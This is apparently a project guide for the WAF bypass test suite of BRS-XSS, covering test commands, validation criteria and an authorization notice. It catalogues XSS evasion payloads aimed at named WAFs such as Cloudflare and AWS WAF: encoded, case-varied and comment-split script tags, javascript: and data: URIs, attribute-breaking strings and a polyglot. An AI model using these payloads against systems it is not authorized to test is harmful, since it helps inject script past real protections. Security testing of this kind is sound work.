# WAF Bypass Testing Guide

**Project:** BRS-XSS (XSS Detection Suite)  
**Company:** EasyProTech LLC (www.easypro.tech)  
**Developer:** Brabus  
**Date:** Wed 15 Oct 2025 02:25:00 MSK  
**Telegram:** https://t.me/EasyProTech

## Overview

This document describes the WAF bypass testing suite for BRS-XSS, which validates the effectiveness of various evasion techniques against known WAF products.

## Supported WAFs

The test suite validates bypasses against:

1. **Cloudflare** - Industry-leading CDN/WAF
2. **AWS WAF** - Amazon Web Services WAF
3. **ModSecurity** - Open-source WAF
4. **Imperva (Incapsula)** - Enterprise WAF
5. **Akamai** - CDN with WAF capabilities
6. **F5 BIG-IP ASM** - Application Security Manager
7. **Barracuda** - Network security appliance
8. **Fortinet FortiWeb** - Web application firewall

## Bypass Techniques

### Encoding Techniques

#### URL Encoding
```python
<script>alert(1)</script>
→ %3Cscript%3Ealert(1)%3C/script%3E
```

#### Double URL Encoding
```python
<script>alert(1)</script>
→ %253Cscript%253Ealert(1)%253C/script%253E
```

#### HTML Entity Encoding
```python
<script>alert(1)</script>
→ &lt;script&gt;alert(1)&lt;/script&gt;
→ &#60;script&#62;alert(1)&#60;/script&#62;
→ &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E
```

#### Unicode Encoding
```python
<script>alert(1)</script>
→ \u003Cscript\u003Ealert(1)\u003C/script\u003E
→ \x3Cscript\x3Ealert(1)\x3C/script\x3E
```

#### Hex Encoding
```python
alert(1)
→ \x61\x6c\x65\x72\x74\x28\x31\x29
```

### Case Variation

```python
<script>alert(1)</script>
→ <ScRiPt>alert(1)</ScRiPt>
→ <SCRIPT>alert(1)</SCRIPT>
→ <sCrIpT>alert(1)</sCrIpT>
```

### Whitespace Injection

```python
<script>alert(1)</script>
→ <script >alert(1)</script >
→ <script  >alert(1)</script  >
→ <script\t>alert(1)</script\t>
→ <script\n>alert(1)</script\n>
```

### Comment Insertion

#### HTML Comments
```python
<script>alert(1)</script>
→ <script><!---->alert(1)</script>
→ <scr<!---->ipt>alert(1)</scr<!---->ipt>
```

#### JavaScript Comments
```python
alert(1)
→ al/**/ert(1)
→ al//\nert(1)
```

### String Concatenation

```python
alert(1)
→ alert(1)
→ al+ert(1)
→ "al"+"ert"+(1)
→ String.fromCharCode(97,108,101,114,116)
```

### Null Byte Injection

```python
<script>alert(1)</script>
→ <script\x00>alert(1)</script>
→ <scr\x00ipt>alert(1)</scr\x00ipt>
```

### Tab Variations

```python
<script>alert(1)</script>
→ <script\t>alert(1)</script>
→ <\tscript>alert(1)</script>
```

### Payload Splitting

```python
<script>alert(1)</script>
→ <scr + ipt>alert(1)</scr + ipt>
```

### Protocol Variations

#### Data URI
```python
<img src="data:image/svg+xml,<svg onload=alert(1)>">
<object data="data:text/html,<script>alert(1)</script>">
```

#### JavaScript URI
```python
<a href="javascript:alert(1)">Click</a>
<form action="javascript:alert(1)"><input type=submit></form>
```

### Polyglot Payloads

```python
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Context Breaking

```python
" onclick="alert(1)"
' onclick='alert(1)'
`onclick=`alert(1)`
```

### Mutation Fuzzing

Automated generation of payload mutations:
- Character substitution
- Delimiter variations
- Tag permutations
- Attribute fuzzing

## Running Tests

### Run All WAF Bypass Tests

```bash
pytest tests/waf/test_waf_bypass_suite.py -v
```

### Run Specific Technique Tests

```bash
# Test encoding bypasses
pytest tests/waf/test_waf_bypass_suite.py::TestWAFBypassTechniques::test_url_encoding_bypass -v

# Test Cloudflare bypasses
pytest tests/waf/test_waf_bypass_suite.py::TestWAFBypassTechniques::test_cloudflare_specific_bypass -v

# Test polyglot generation
pytest tests/waf/test_waf_bypass_suite.py::TestWAFBypassTechniques::test_polyglot_payload_generation -v
```

### Run with Coverage

```bash
pytest tests/waf/test_waf_bypass_suite.py --cov=brsxss.waf --cov-report=html
```

## Test Structure

```python
class TestWAFBypassTechniques:
    """Main test class for bypass techniques"""
    
    @pytest.fixture
    def evasion_engine(self):
        """Create evasion engine instance"""
        return EvasionEngine()
    
    def test_technique_name(self, evasion_engine, sample_payload):
        """Test specific bypass technique"""
        # Generate evasions
        evasions = evasion_engine.generate_evasions(...)
        
        # Validate results
        assert len(evasions) > 0
        assert all(e.success_probability > 0 for e in evasions)
```

## Validation Criteria

Each bypass technique is validated against:

1. **Payload Generation** - Technique generates valid mutations
2. **Uniqueness** - Generated payloads are unique
3. **Success Probability** - Realistic success probability (0.0-1.0)
4. **Effectiveness Sorting** - Payloads sorted by effectiveness
5. **Diversity** - Multiple technique types generated
6. **WAF-Specific** - Correct techniques for each WAF

## Success Metrics

- **Pass Rate**: >95% of tests must pass
- **Coverage**: >80% code coverage for WAF modules
- **Diversity**: >5 different techniques per WAF
- **Uniqueness**: >70% of payloads must be unique

## Adding New Bypass Tests

```python
def test_new_bypass_technique(self, evasion_engine, sample_payload):
    """Test description"""
    # Generate evasions
    evasions = evasion_engine.generate_evasions(
        sample_payload,
        detected_wafs=[...],
        max_variations=10
    )
    
    # Validate
    assert len(evasions) > 0
    assert all(hasattr(e, 'mutated_payload') for e in evasions)
    assert all(hasattr(e, 'success_probability') for e in evasions)
    assert all(hasattr(e, 'technique') for e in evasions)
```

## Continuous Integration

WAF bypass tests run automatically on:

- **Pull Requests** - All tests must pass
- **Release Pipeline** - Full test suite validation
- **Nightly Builds** - Extended test coverage

## False Positive Management

Tests should avoid:
- Assuming all payloads will bypass all WAFs
- Testing against live WAF services without permission
- Hardcoding expected bypass rates

## Best Practices

1. **Test in Isolation** - Each test should be independent
2. **Use Fixtures** - Reuse common setup with pytest fixtures
3. **Clear Assertions** - Make test failures easy to understand
4. **Document Expected Behavior** - Add comments for complex tests
5. **Realistic Scenarios** - Test real-world bypass scenarios

## References

- [OWASP Web Application Firewall Evasion](https://owasp.org/www-community/attacks/Testing_for_WAF)
- [ModSecurity Bypass Techniques](https://github.com/0xInfection/Awesome-WAF#evasion-techniques)
- [Cloudflare WAF Documentation](https://developers.cloudflare.com/waf/)
- [AWS WAF Best Practices](https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter.html)

## Security Notice

**AUTHORIZATION REQUIRED**: WAF bypass testing should only be performed on:
- Systems you own
- Systems with explicit written authorization
- Controlled test environments

Unauthorized WAF bypass testing may violate:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act 1990 (UK)
- Local computer crime laws

## Support

For questions about WAF bypass testing:
- Telegram: https://t.me/EasyProTech
- GitHub Issues: https://github.com/EPTLLC/brs-xss/issues

---

**BRS-XSS v2.0.0** | **EasyProTech LLC** | **https://t.me/EasyProTech**

